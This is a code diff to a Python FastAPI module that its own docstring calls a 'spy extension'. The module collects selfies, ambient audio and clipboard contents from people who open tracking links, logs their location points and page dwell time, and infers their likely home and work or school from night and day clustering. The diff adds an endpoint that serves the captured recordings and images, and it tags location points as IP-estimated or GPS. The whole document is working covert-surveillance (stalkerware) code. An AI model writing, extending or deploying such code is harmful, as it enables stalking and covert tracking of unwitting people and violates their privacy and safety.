@@ -1,4 +1,4 @@
-"""スパイ拡張：自撮り・環境音・画面・クリップボード・滞在ログ・拠点推定・移動手段。"""
+"""スパイ拡張：自撮り・環境音・クリップボード・滞在ログ・拠点推定・移動手段。"""
 from __future__ import annotations
 
 import base64, datetime as dt, json, math, os, re, time
@@ -6,7 +6,7 @@ import base64, datetime as dt, json, math, os, re, time
 from fastapi import APIRouter, Depends, HTTPException, Request
 from fastapi.responses import FileResponse, HTMLResponse
 
-from . import tenancy
+from . import linktrack, tenancy
 from .tenancy import db
 
 router = APIRouter()
@@ -84,7 +84,11 @@ async def cap(code: str, request: Request):
              json.dumps(body.get("meta") or {}, ensure_ascii=False), _now()))
         cid = cur.lastrowid
     if hit:
-        db.update_hit(hit, **{kind: fname})
+        col = "screen_cap" if kind == "screen" else kind
+        try:
+            db.update_hit(hit, **{col: fname})
+        except Exception:
+            pass
     return {"ok": True, "id": cid, "file": fname}
 
 
@@ -155,6 +159,20 @@ def cap_file(code: str, cid: int):
         raise HTTPException(404)
     return FileResponse(p, media_type=r["mime"] or "application/octet-stream")
 
+
+@router.get("/s/{code}/f/{name}")
+def cap_name(code: str, name: str):
+    """ファイル名だけで取得（link_hits に保存した名前から直接見る用）。"""
+    if not _owner(code):
+        raise HTTPException(404)
+    safe = os.path.basename(name)
+    p = os.path.join(_dir(code), safe)
+    if not os.path.exists(p):
+        raise HTTPException(404)
+    mime = "audio/webm" if safe.startswith("voice") else "image/jpeg"
+    return FileResponse(p, media_type=mime)
+
+
 @router.get("/sw.js")
 def service_worker():
     p = "static/sw.js"
@@ -180,6 +198,7 @@ def ping(code: str, request: Request, hit: int = 0, sid: str = ""):
         return {"ok": 0}
     return {"ok": 1, "server": _now()}
 
+
 # ---------- 解析 ----------
 
 def _hav(a, b, c, d):
@@ -190,10 +209,18 @@ def _hav(a, b, c, d):
     return 2 * R * math.asin(math.sqrt(x))
 
 
+def _g(d, k, dv=None):
+    try:
+        v = d[k]
+        return dv if v is None else v
+    except (KeyError, IndexError, TypeError):
+        return dv
+
+
 def _insight(code):
     pts = [dict(r) for r in db.q(
-        "SELECT id,ts,lat,lon,spd,city FROM track_points WHERE code=? AND lat IS NOT NULL "
-        "ORDER BY id", (code,))]
+        "SELECT id,ts,lat,lon,spd,city,src,mobile FROM track_points "
+        "WHERE code=? AND lat IS NOT NULL ORDER BY id", (code,))]
     speeds, moved = [], 0.0
     for i in range(1, len(pts)):
         a, b = pts[i - 1], pts[i]
@@ -228,10 +255,12 @@ def _insight(code):
         k = (round(p["lat"] / 0.005), round(p["lon"] / 0.005))
         g = grid.setdefault(k, {"n": 0, "lat": 0.0, "lon": 0.0, "night": 0,
                                 "day": 0, "first": p["ts"], "last": p["ts"],
-                                "city": p["city"] or ""})
+                                "city": p["city"] or "", "ip": 0})
         g["n"] += 1
         g["lat"] += p["lat"]
         g["lon"] += p["lon"]
+        if (p.get("src") or "") == "ip":
+            g["ip"] += 1
         try:
             h = dt.datetime.fromisoformat(p["ts"]).hour
         except Exception:
@@ -249,6 +278,7 @@ def _insight(code):
         g["lon"] /= g["n"]
         g["label"] = ("自宅候補" if g["night"] > g["day"]
                       else "職場・学校候補" if g["day"] > g["night"] else "滞在地点")
+        g["acc"] = ("IP推定" if g["ip"] > g["n"] / 2 else "GPS")
         spots.append(g)
     spots.sort(key=lambda x: -x["n"])
 
@@ -264,10 +294,18 @@ def _insight(code):
 
     dwell = db.q1("SELECT COUNT(*) n, SUM(dwell_ms) s, MAX(scroll) m "
                   "FROM link_hits WHERE code=?", (code,)) or {}
+
+    ip_only = sum(1 for p in pts if (p.get("src") or "") == "ip")
+    mob = sum(1 for p in pts if _g(p, "mobile", 0))
+    warn = ""
+    if ip_only:
+        warn = linktrack.IP_WARN + (f"（モバイル回線の点: {mob}件）" if mob else "")
+
     return {
         "points": len(pts), "moved_m": round(moved), "avg_kmh": round(avg, 1),
         "max_kmh": round(max(speeds), 1) if speeds else 0, "transport": mode,
         "spots": spots[:6], "repeaters": rep, "captures": caps,
+        "ip_only": ip_only, "mobile_points": mob, "warn": warn,
         "dwell_ms": int(dwell["s"] or 0), "dwell_n": int(dwell["n"] or 0),
         "max_scroll": float(dwell["m"] or 0),
     }
